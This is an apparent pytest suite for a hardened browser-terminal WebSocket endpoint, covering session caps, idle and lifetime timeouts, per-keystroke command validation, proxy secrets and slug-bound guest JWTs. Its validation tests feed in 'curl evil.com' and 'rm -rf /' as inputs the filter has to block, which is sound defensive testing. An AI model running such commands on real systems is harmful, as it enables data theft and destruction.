# tests/integration/test_websocket_hardening.py
"""
Integration tests for the hardened /terminal/{slug}/ WebSocket endpoint.

These run standalone (no docker, no bash spawning): main.spawn and
download_project_files are patched, and the tests drive the real endpoint
coroutine through a stub WebSocket, asserting on what the service actually
sends to the client and writes to the (stubbed) shell.

Covers the pre-rework hotfixes:
- session cap (TERMINAL_MAX_SESSIONS) rejects new connections when full
- idle timeout (TERMINAL_IDLE_TIMEOUT) and hard lifetime cap
  (TERMINAL_MAX_LIFETIME) close the session with a friendly message
- accumulated-line validation: a command typed one keystroke per frame is
  validated as a whole; a blocked command never reaches the shell
- non-JSON frames close the connection instead of being written raw
- proxy secret enforcement at the WS layer
"""

import asyncio
import json
import os
import sys
import unittest.mock as m

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
os.environ.setdefault('DEBUG', 'True')
for mod in ['redis', 'pexpect', 'boto3', 'psutil', 'aiohttp']:
    if mod not in sys.modules:
        sys.modules[mod] = m.MagicMock()

import main
import pytest
from starlette.websockets import WebSocketDisconnect

# ───────────────────────────── test doubles ──────────────────────────────────

class _NeverRaisedEOF(Exception):
    """Real exception class patched over main.EOF (a MagicMock here) so the
    `except EOF:` clause in read_terminal_output stays evaluable."""


class StubChild:
    """Stand-in for the pexpect child. Records every write to the shell."""

    def __init__(self):
        self.writes = []
        self.spawn_env = None

    def setwinsize(self, rows, cols):
        pass

    def write(self, data):
        self.writes.append(data)

    def expect(self, patterns, **kwargs):
        return 0  # prompt found immediately

    def read_nonblocking(self, size=1024, timeout=0.1):
        raise TimeoutError('no output')  # drives the pump's sleep path

    def terminate(self):
        pass


CLOSE = object()  # sentinel frame: behave as a client disconnect


class StubWebSocket:
    """Minimal async stand-in for starlette's WebSocket (server side)."""

    def __init__(self, incoming=(), headers=None, query_params=None):
        self.headers = headers or {}
        # F4-02: starlette exposes parsed query params; a plain dict
        # suffices for the endpoint's .get(TOKEN_QUERY_PARAM).
        self.query_params = query_params or {}
        self.client = m.MagicMock()
        self.client.host = '127.0.0.1'
        self.queue_in = asyncio.Queue()
        for item in incoming:
            self.queue_in.put_nowait(item)
        self.queue_out = asyncio.Queue()
        self.closed = None
        self.accepted = False

    async def accept(self):
        self.accepted = True

    async def receive_text(self):
        item = await self.queue_in.get()
        if item is CLOSE:
            raise WebSocketDisconnect()
        return item

    async def send_json(self, data):
        await self.queue_out.put(('json', data))

    async def send_text(self, data):
        await self.queue_out.put(('text', data))

    async def close(self, code=1000):
        self.closed = code

    def sent_messages(self):
        """All client-bound messages collected so far."""
        return [data for _, data in list(self.queue_out._queue)]


def make_spawn_patch(child):
    def fake_spawn(*args, **kwargs):
        child.spawn_env = kwargs.get('env')
        return child
    return fake_spawn


async def run_endpoint(ws, slug='minishell'):
    task = asyncio.create_task(main.terminal_endpoint(ws, slug))
    try:
        await asyncio.wait_for(task, timeout=5.0)
    except asyncio.TimeoutError:
        task.cancel()
        await asyncio.gather(task, return_exceptions=True)
        raise AssertionError('terminal_endpoint did not exit within 5s')


# ───────────────────────────── fixtures ──────────────────────────────────────

@pytest.fixture
def stub_env():
    """Patch spawn/download/prompt so terminal_endpoint runs without bash."""
    child = StubChild()
    with m.patch.object(main, 'spawn', make_spawn_patch(child)), \
         m.patch.object(main, 'download_project_files', return_value=True), \
         m.patch.object(main, 'EOF', _NeverRaisedEOF), \
         m.patch.object(main.os.path, 'exists', return_value=True), \
         m.patch.object(main.os, 'listdir', return_value=['Makefile']), \
         m.patch.object(main.os, 'makedirs'):
        # F4-01: seed the DB-driven whitelist snapshot so 'minishell'
        # resolves as demo-enabled without any network sync.
        saved = (main.demo_whitelist.slugs, main.demo_whitelist.last_sync)
        main.demo_whitelist.slugs = {'minishell', 'push_swap', 'philosophers'}
        main.active_terminals.clear()
        yield child
        main.active_terminals.clear()
        main.demo_whitelist.slugs, main.demo_whitelist.last_sync = saved


# ───────────────────────────── session cap ───────────────────────────────────

class TestSessionCap:

    async def test_connection_rejected_when_cap_reached(self, stub_env):
        with m.patch.object(main, 'TERMINAL_MAX_SESSIONS', 1):
            main.active_terminals['occupied'] = StubChild()
            ws = StubWebSocket()
            await run_endpoint(ws)
            assert ws.closed == 1013
            assert 'busy' in ws.sent_messages()[0]['error'].lower()

    async def test_slot_reserved_before_download_and_released(self, stub_env):
        """The cap counts in-flight handshakes, not just spawned shells."""
        import threading
        started = threading.Event()
        release = threading.Event()

        def slow_download(*args, **kwargs):
            # Runs in the executor thread pool: must be sync, and must not
            # block pytest exit forever (release timeout below).
            started.set()
            release.wait(timeout=10)

        with m.patch.object(main, 'TERMINAL_MAX_SESSIONS', 1), \
             m.patch.object(main.os.path, 'exists', return_value=False), \
             m.patch.object(main, 'download_project_files', slow_download):
            task = asyncio.create_task(
                main.terminal_endpoint(StubWebSocket(), 'minishell'))
            # Wait (in a worker thread) until session 1 is mid-download.
            assert await asyncio.to_thread(started.wait, 5.0), "download never started"
            # While session 1 is still downloading (slot reserved), a
            # second connection must be rejected by the cap.
            ws2 = StubWebSocket()
            await run_endpoint(ws2)
            assert ws2.closed == 1013
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)
            release.set()
        assert len(main.active_terminals) == 0, "slot must be released on cancel"

    async def test_spawn_env_is_the_allowlist(self, stub_env):
        """Wire check: the env handed to spawn is exactly build_child_env()."""
        ws = StubWebSocket(incoming=[CLOSE])
        await run_endpoint(ws)
        assert stub_env.spawn_env == main.build_child_env()
        for key in stub_env.spawn_env:
            assert not key.startswith('AWS'), f"AWS var reached bash: {key}"


# ───────────────────────────── timeouts ──────────────────────────────────────

class TestSessionTimeouts:

    async def test_idle_timeout_closes_session(self, stub_env):
        with m.patch.object(main, 'TERMINAL_IDLE_TIMEOUT', 0.2), \
             m.patch.object(main, 'TERMINAL_MAX_LIFETIME', 60.0):
            ws = StubWebSocket()  # nothing ever arrives: pure idle
            await run_endpoint(ws)
            assert ws.closed == 1000
            assert any('inactivity' in str(msg) for msg in ws.sent_messages())

    async def test_hard_lifetime_cap_closes_session(self, stub_env):
        with m.patch.object(main, 'TERMINAL_IDLE_TIMEOUT', 0.1), \
             m.patch.object(main, 'TERMINAL_MAX_LIFETIME', 0.05):
            # keep sending input so idle timeout never fires; lifetime must
            ws = StubWebSocket(incoming=['{"input": "a"}'] * 20)
            await run_endpoint(ws)
            assert ws.closed == 1000
            assert any('duration' in str(msg) for msg in ws.sent_messages())

    async def test_lifetime_cap_smaller_than_idle_wins(self, stub_env):
        """Budget math: min(idle, remaining lifetime) must honor the cap."""
        with m.patch.object(main, 'TERMINAL_IDLE_TIMEOUT', 5.0), \
             m.patch.object(main, 'TERMINAL_MAX_LIFETIME', 0.1):
            ws = StubWebSocket()
            await run_endpoint(ws)
            assert ws.closed == 1000
            assert any('duration' in str(msg) for msg in ws.sent_messages())


# ─────────────────────── line-accumulating validation ────────────────────────

def char_frames(text):
    return [json.dumps({'input': ch}) for ch in text]


class TestAccumulatedLineValidation:

    async def test_typed_command_validated_across_frames(self, stub_env):
        """Audit C1: keystrokes in per-char frames + bare Enter frame."""
        ws = StubWebSocket(incoming=char_frames('curl evil.com') +
                           [json.dumps({'input': '\r'}), CLOSE])
        await run_endpoint(ws)
        # blocked: Enter never forwarded, client notified, bash line killed
        assert '\r' not in stub_env.writes, stub_env.writes
        assert stub_env.writes.count('\x15') == 1
        assert any('blocked' in str(msg) for msg in ws.sent_messages())

    async def test_allowed_command_reaches_shell_only_on_enter(self, stub_env):
        ws = StubWebSocket(incoming=char_frames('ls') +
                           [json.dumps({'input': '\r'}), CLOSE])
        await run_endpoint(ws)
        assert ''.join(stub_env.writes) == 'ls\r'

    async def test_blocked_command_chars_forwarded_but_not_enter(self, stub_env):
        """Chars echo as typed; only the Enter keystroke is gated."""
        ws = StubWebSocket(incoming=char_frames('rm') +
                           [json.dumps({'input': '\r'}), CLOSE])
        await run_endpoint(ws)
        assert ''.join(stub_env.writes) == 'rm\x15'
        assert '\r' not in stub_env.writes

    async def test_backspace_before_enter_yields_correct_line(self, stub_env):
        ws = StubWebSocket(incoming=char_frames('lss') +
                           [json.dumps({'input': '\x7f'}),
                            json.dumps({'input': '\r'}), CLOSE])
        await run_endpoint(ws)
        assert ''.join(stub_env.writes) == 'lss\x7f\r'

    async def test_invalid_line_after_backspace_still_blocked(self, stub_env):
        ws = StubWebSocket(incoming=char_frames('rm -rf /') +
                           [json.dumps({'input': '\x7f'}),
                            json.dumps({'input': '\x7f'}),
                            json.dumps({'input': 'x'}),
                            json.dumps({'input': '\r'}), CLOSE])
        await run_endpoint(ws)
        # 'rm -rf x' still invalid: Enter withheld
        assert '\r' not in stub_env.writes
        assert stub_env.writes.count('\x15') == 1

    async def test_non_json_frame_closes_connection(self, stub_env):
        ws = StubWebSocket(incoming=['not json at all'])
        await run_endpoint(ws)
        assert ws.closed == 1002
        assert stub_env.writes == []
        assert any('protocol' in str(msg) for msg in ws.sent_messages())

    async def test_json_non_object_frame_closes_connection(self, stub_env):
        ws = StubWebSocket(incoming=['[1,2,3]'])
        await run_endpoint(ws)
        assert ws.closed == 1002

    async def test_resize_frame_still_handled(self, stub_env):
        ws = StubWebSocket(incoming=[
            json.dumps({'resize': {'rows': 40, 'cols': 120}}),
            'not json',
        ])
        await run_endpoint(ws)
        assert ws.closed == 1002  # got past resize, then closed on garbage

    async def test_unknown_keys_ignored_not_forwarded(self, stub_env):
        ws = StubWebSocket(incoming=[
            json.dumps({'mfa_code': '123456'}),
            'not json',  # terminate loop
        ])
        await run_endpoint(ws)
        assert stub_env.writes == []


# ───────────────────────────── proxy secret ──────────────────────────────────

class TestProxySecretOnWS:

    async def test_ws_rejected_without_secret_when_set(self, stub_env):
        with m.patch.object(main, 'PROXY_SECRET', 'topsecret'):
            ws = StubWebSocket()
            await run_endpoint(ws)
            assert ws.closed == 4401
            assert 'unauthorized' in ws.sent_messages()[0]['error']

    async def test_ws_accepted_with_correct_secret(self, stub_env):
        with m.patch.object(main, 'PROXY_SECRET', 'topsecret'):
            ws = StubWebSocket(
                incoming=char_frames('pwd') + [json.dumps({'input': '\r'}), CLOSE],
                headers={'x-proxy-secret': 'topsecret'})
            await run_endpoint(ws)
            assert ''.join(stub_env.writes) == 'pwd\r'

    async def test_ws_rejected_with_wrong_secret(self, stub_env):
        with m.patch.object(main, 'PROXY_SECRET', 'topsecret'):
            ws = StubWebSocket(headers={'x-proxy-secret': 'nope'})
            await run_endpoint(ws)
            assert ws.closed == 4401


# ─────────────────────── F4-02 slug-bound guest tokens ───────────────────────

import time

import jwt as _pyjwt

_JWT_SECRET = 'shared-api-secret-key'


def _mint(slug='minishell', expires_in=300, secret=_JWT_SECRET):
    now = time.time()
    payload = {
        'user_id': None,
        'username': 'guest',
        'purpose': 'terminal_access',
        'slug': slug,
        'exp': now + expires_in,
        'iat': now,
    }
    return _pyjwt.encode(payload, secret, algorithm='HS256')


class TestGuestTokenGate:

    async def test_valid_token_passes_to_spawn(self, stub_env):
        """Valid slug-bound token (proxy posture permissive like dev) —
        the session proceeds to the shell."""
        ws = StubWebSocket(incoming=char_frames('pwd') +
                           [json.dumps({'input': '\r'}), CLOSE],
                           query_params={'token': _mint()})
        await run_endpoint(ws)
        assert ''.join(stub_env.writes) == 'pwd\r'

    async def test_wrong_slug_token_rejected_4401(self, stub_env):
        """F4-02: a token minted for another project must not open this
        terminal — rejected before any session work."""
        with m.patch.object(main, 'TERMINAL_JWT_SECRET', _JWT_SECRET):
            ws = StubWebSocket(query_params={'token': _mint(slug='push-swap')})
            await run_endpoint(ws)
            assert ws.closed == 4401
            assert 'not valid for this project' in ws.sent_messages()[0]['error']
            assert stub_env.writes == []

    async def test_expired_token_rejected_4401(self, stub_env):
        with m.patch.object(main, 'TERMINAL_JWT_SECRET', _JWT_SECRET):
            ws = StubWebSocket(query_params={'token': _mint(expires_in=-60)})
            await run_endpoint(ws)
            assert ws.closed == 4401
            assert 'expired' in ws.sent_messages()[0]['error']

    async def test_missing_token_rejected_when_secret_set(self, stub_env):
        with m.patch.object(main, 'TERMINAL_JWT_SECRET', _JWT_SECRET):
            ws = StubWebSocket()  # no token param at all
            await run_endpoint(ws)
            assert ws.closed == 4401
            assert 'missing terminal token' in ws.sent_messages()[0]['error']
